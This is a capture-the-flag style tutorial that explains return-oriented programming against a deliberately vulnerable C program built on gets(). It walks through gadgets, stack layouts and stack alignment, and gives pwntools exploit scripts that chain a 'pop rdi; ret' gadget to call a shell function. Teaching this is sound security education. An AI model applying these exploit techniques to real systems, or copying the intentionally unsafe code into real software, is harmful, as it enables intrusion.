# ROP

The code has been modified to add a parameter for the shell function. Can we still exploit it?

```c
#include <stdio.h>
int shell(int x){
    if(x==123456){
        system("/bin/sh");
    }else{
        printf("Die");
    }
}

int main(){
    char name[100];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc chal.c -o chal -no-pie -fno-stack-protector`

Looking at the disassembly, it seems 112 (0x70) bytes are allocated for the name buffer.

```asm
0x00000000004011c5 <+40>:    lea    rax,[rbp-0x70]
0x00000000004011c9 <+44>:    mov    rdi,rax
0x00000000004011cc <+47>:    mov    eax,0x0
0x00000000004011d1 <+52>:    call   0x401060 <gets@plt>
```

If we follow the same procedure it buffer overflow, we get the following payload:

```python
# Remember +8 bytes for rbp
p.sendline(b"a"*120+p64(elf.symbols["shell"]))
```

However, this segfaults because we did not pass `shell` any parameters. We can use return oriented programming (ROP) to overcome this.

## Principles

Recall that the `rdi` register is used to pass data as the first argument of a function. For example, in the disassembly above,

```asm
lea  rax,[rbp-0x70]
mov  rdi,rax
call 0x401060 <gets@plt>
```

the address `rbp-0x70` is moved into `rdi` to be passed to `gets`.

But how do we set `rdi` to whatever we want? Luckily, the binary is full of random instructions we can jump to, known as gadgets. We can use the ropper tool to list all useful gadgets.

```shell
➜ ropper -f chal
Gadgets
=======
[stuff]
0x0000000000401267: pop rbp; pop r14; pop r15; ret; 
0x0000000000401149: pop rbp; ret;  
0x000000000040126b: pop rdi; ret;  <--
0x0000000000401269: pop rsi; pop r15; ret;
[stuff]
```

Let's look at the gadget `pop rdi; ret;`. Before we find out how it helps us, we must understand what it does.

**`pop rdi;`**

[pop](https://www.felixcloutier.com/x86/pop): Loads the value from the top of stack into the destination specified (`rdi`) and **increments the stack pointer**. Remember that the `rbp` is the base (highest address) of the stack, `rip` > `rbp` > `rsp`. By incrementing `rsp`, `rsp` moves toward `rbp`.

**`ret;`**

`ret` pops the **value pointed to by `rsp`** into `rip` and increments `rsp`.

## Working through the attack

The bottom half of `main` is provided for reference:

```asm
0x00000000004011f6 <+89>:    lea    rax,[rbp-0x70]
0x00000000004011fa <+93>:    mov    rdi,rax
0x00000000004011fd <+96>:    call   0x401030 <puts@plt>
0x0000000000401202 <+101>:   mov    eax,0x0
0x0000000000401207 <+106>:   leave  
0x0000000000401208 <+107>:   ret
```

Let's say our stack looks like this at `main + 101`:

| Address              | Name          | Value                                  |
| -------------------- | ------------- | -------------------------------------- |
| `rbp+24`             | -             | Address of `shell`                     |
| `rbp+16`             | -             | 123456                                 |
| `rbp+8`              | `rip`         | Address of `pop rdi; ret;` gadget      |
| `rbp`                | `rbp`         | Address of `rbp` / any arbitrary value |
| `rbp-112` to `rbp-1` | `name` buffer | a 112 times                            |
| `rbp-112`            | `rsp`         | a                                      |

The leave instruction is [equivalent to:](https://stackoverflow.com/a/29790275/11168593)

```asm
mov rsp,rbp
pop rbp
```

Thus, when `main + 106` (`leave`) is executed, `rsp` is set to `rbp`. Then, the top of the stack (`rsp` = `rbp` ) is popped into `rbp` (essentially a no-op). However, this pop increments `rsp`. Thus, the stack now looks like this:

| Address  | Name        | Value                             |
| -------- | ----------- | --------------------------------- |
| `rbp+24` | -           | Address of `shell`                |
| `rbp+16` | -           | 123456                            |
| `rbp+8`  | `rip`/`rsp` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp`       | Address of `rbp`                  |

When `main + 107` (`ret`) is executed, `rsp` is popped into `rip` (no-op because they are the same address). Then, `rsp` is incremented. Thus the stack now looks like this:

| Address  | Name  | Value                             |
| -------- | ----- | --------------------------------- |
| `rbp+24` | -     | Address of `shell`                |
| `rbp+16` | `rsp` | 123456                            |
| `rbp+8`  | `rip` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp` | Address of `rbp`                  |

Now, the instruction pointed to by `rip` is executed.

a. `pop rdi`: Pops `rsp` (12356) into `rdi` (yay) and increments `rsp`. The stack now looks like this:

| Address  | Name  | Value                             |
| -------- | ----- | --------------------------------- |
| `rbp+24` | `rsp` | Address of `shell`                |
| `rbp+16` | -     | 123456                            |
| `rbp+8`  | `rip` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp` | Address of `rbp`                  |
|          |       |                                   |
| ???      | `rdi` | 123456                            |

b. `ret`: Pops `rsp` (Address of `shell`) into `rip` (yay) and increments `rsp`. The stack now looks like this:

| Address  | Name  | Value              |
| -------- | ----- | ------------------ |
| `rbp+24` | -     | Address of `shell` |
| `rbp+16` | -     | 123456             |
| `rbp+8`  | `rip` | Address of `shell` |
| `rbp`    | `rbp` | Address of `rbp`   |
|          |       |                    |
| ???      | `rdi` | 123456             |

Next, the instruction at `rip` (Address of `shell`) is executed. Because `rdi` is `123456`, this is equivalent to `shell(123456)` which allows us to get a shell.

## Payload

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
rop = p64(0x000000000040126b)
p.sendline(b"a"*120+rop+p64(123456)+p64(e.symbols["shell"]))
p.interactive()
```

## Stack alignment?

The payload above works in kali but not on Ubuntu, because of the [MOVAPS issue](https://www.cameronwickes.com/stack-alignment-ubuntu-18-04-movaps/). On Ubuntu 18.04, the MOVAPS (move aligned packed single precision) instruction is used to move data (4 32 bit single precision floats / 16 bytes).

As its name indicates:

> When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated.

Our stack is not aligned on 16 bytes, thus an exception is generated. 

We can resolve this issue by adding another gadget: `0x0000000000401016: ret; `. The starting stack now looks like this:

| Address  | Name        | Value                             |
| -------- | ----------- | --------------------------------- |
| `rbp+32` | -           | Address of `shell`                |
| `rbp+24` | -           | Address of `ret;` gadget          |
| `rbp+16` | -           | 123456                            |
| `rbp+8`  | `rip`/`rsp` | Address of `pop rdi; ret;` gadget |
| `rbp`    | `rbp`       | Address of `rbp`                  |

Now, our stack is aligned to 16 bytes, so the exploit will work. You can trace through the stack for each instruction to verify that it works. In the end, the stack should look like this:

| Address  | Name  | Value                   |
| -------- | ----- | ----------------------- |
| `rbp+32` | -     | Address of `shell`      |
| `rbp+24` | -     | Address of `ret` gadget |
| `rbp+16` | -     | 123456                  |
| `rbp+8`  | `rip` | Address of `shell`      |
| `rbp`    | `rbp` | Address of `rbp`        |
| `rdi`    |       | 123456                  |

## Payload

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
rop = p64(0x000000000040126b)
rop2 = p64(0x0000000000401016)
p.sendline(b"a"*120+rop+p64(123456)+rop2+p64(e.symbols["shell"]))
p.interactive()
```

## Alternative using pwntools ROP library

```python
from pwn import *

p = process("./chal")
e = ELF("./chal")
context.binary = e
rop = ROP(e)
rop.call(rop.ret)
rop.call(e.symbols["shell"],(123456,))

p.sendline(b"a"*120+rop.chain())

p.interactive()
```

The ROP library automatically finds and sticks together gadgets to create an equivalent payload.